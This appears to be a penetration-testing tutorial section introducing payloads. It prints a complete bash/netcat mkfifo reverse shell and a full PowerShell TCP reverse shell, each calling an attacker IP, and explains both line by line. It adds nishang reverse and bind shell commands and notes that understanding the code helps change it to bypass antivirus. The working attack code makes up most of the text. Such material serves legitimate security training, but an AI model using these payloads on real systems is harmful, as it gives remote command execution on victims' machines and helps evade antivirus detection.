# 06 — Introduction to Payloads

## Overview

A payload is simply **the code/commands that perform the action you want** on a target system. Just like the message in an email is the "payload" of that packet, our exploit code is the payload we deliver to get a shell. There's nothing magical about it — it's just instructions telling the computer what to do.

---

## Netcat/Bash Reverse Shell One-Liner — Fully Dissected

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

| Part | Command | What It Does |
|------|---------|-------------|
| 1 | `rm -f /tmp/f;` | Delete the pipe file if it exists (`-f` ignores errors if missing) |
| 2 | `mkfifo /tmp/f;` | Create a named pipe (FIFO) — a special file that connects input/output |
| 3 | `cat /tmp/f \|` | Read from the pipe, send output to the next command |
| 4 | `/bin/bash -i 2>&1 \|` | Start interactive Bash, merge stderr into stdout |
| 5 | `nc 10.10.14.12 7777` | Connect to attacker's listener on port 7777 |
| 6 | `> /tmp/f` | Send attacker's typed commands back into the pipe → into Bash |

**The loop:**

```
Attacker types command
    → nc sends it over network
    → lands in /tmp/f (pipe)
    → cat reads it
    → bash executes it
    → output goes through nc
    → back to attacker's screen
```

---

## PowerShell Reverse Shell One-Liner — Fully Dissected

```cmd
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

| Part | Code | What It Does |
|------|------|-------------|
| 1 | `powershell -nop -c` | Launch PowerShell, no profile, execute the command string |
| 2 | `New-Object System.Net.Sockets.TCPClient('IP',443)` | Create a TCP connection to attacker on port 443 |
| 3 | `$client.GetStream()` | Open a data stream over the TCP connection |
| 4 | `[byte[]]$bytes = 0..65535\|%{0}` | Create an empty 64KB byte buffer |
| 5 | `$stream.Read($bytes, 0, $bytes.Length)` | Read incoming data (attacker's commands) into the buffer |
| 6 | `System.Text.ASCIIEncoding.GetString(...)` | Convert raw bytes to readable ASCII text |
| 7 | `iex $data 2>&1 \| Out-String` | **Execute the command** (`iex` = `Invoke-Expression`), capture all output |
| 8 | `$sendback + 'PS ' + (pwd).Path + '> '` | Build the prompt string (e.g., `PS C:\Users\victim> `) |
| 9 | `$stream.Write(...)` + `$stream.Flush()` | Send output back to attacker |
| 10 | `$client.Close()` | Clean up the TCP connection when done |

**The loop in plain English:**

```
1. Connect to attacker's IP on port 443
2. Wait for attacker to type a command
3. Receive it as bytes → decode to ASCII
4. Execute it with Invoke-Expression
5. Capture output → encode back to bytes
6. Send output back to attacker
7. Show PS C:\path> prompt
8. Repeat until connection closes
```

---

## Nishang: The One-Liner as a Script

The same logic exists as a reusable PowerShell script in the **nishang** project (`Invoke-PowerShellTcp`):

```powershell
# Reverse shell
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

# Bind shell
Invoke-PowerShellTcp -Bind -Port 4444
```

> Same code, cleaner format. Supports both reverse and bind modes, IPv4 and IPv6.

---

## Key Concepts

### Why AV Blocks These Payloads

AV products **signature-match** known payload patterns. The PowerShell one-liner contains recognizable patterns:

- `System.Net.Sockets.TCPClient` — creating raw sockets
- `Invoke-Expression` — dynamic code execution
- The specific combination of these .NET classes

> Understanding the code helps you figure out **what to change** to bypass AV. If you don't understand the payload, you can't modify it.

### Payload Selection Depends on the Target

| Target Has | Use |
|------------|-----|
| Bash (Linux) | Netcat/Bash one-liner, Python, Perl, PHP |
| PowerShell (Windows) | PowerShell one-liner, nishang scripts |
| cmd.exe only (Windows) | Netcat binary (if uploaded), certutil + payload |
| Python installed | Python reverse shell |
| Web server | Web shell (PHP, ASPX, JSP) |

### Payload Delivery Methods

| Method | Example |
|--------|---------|
| **Manual** | Copy-paste a one-liner into a shell you already have |
| **Automated** | Metasploit generates and delivers the payload for you |
| **File upload** | Upload a script/binary through a web vulnerability |
| **Command injection** | Inject the payload into a vulnerable input field |

> One-liners are manual. Metasploit (next section) automates the entire process.
